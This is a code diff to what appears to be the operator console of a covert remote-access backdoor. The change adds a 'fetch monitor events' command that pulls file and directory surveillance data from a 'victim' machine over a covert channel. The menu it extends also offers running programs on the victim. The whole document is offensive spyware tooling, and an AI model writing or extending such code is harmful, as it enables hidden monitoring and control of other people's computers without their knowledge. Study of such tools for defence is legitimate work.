@@ -324,6 +324,16 @@ def cmd_run_program(comm: Commander):
         print(output)
         print("----------[ End ]----------")
 
+def cmd_fetch_events(comm: Commander):
+    print("Get Minitor events from victim...")
+    comm.send_covert_message(b"CMD_FETCH_EVENTS")
+    resp = comm.recv_covert_message()
+    if resp:
+        print("=== Monitor Events ===")
+        print(resp.decode(errors='ignore'))
+    else:
+        print("No events found or timeout")
+
 comm = None
 
 def main():
@@ -366,6 +376,7 @@ def main():
             print("9. Monitor a file")
             print("10. Monitor a directory")
             print("11. Run a program on victim")
+            print("12. Fetch monitor events")
             print("0. Exit")
             choice = input("Select an option: ").strip()
             if choice == '2':
@@ -389,6 +400,8 @@ def main():
                 cmd_monitor_dir(comm)
             elif choice == '11':
                 cmd_run_program(comm)
+            elif choice == '12':
+                cmd_fetch_events(comm)
             elif choice == '0':
                 # Exit the commander (also disconnect if connected)
                 if comm.connected:
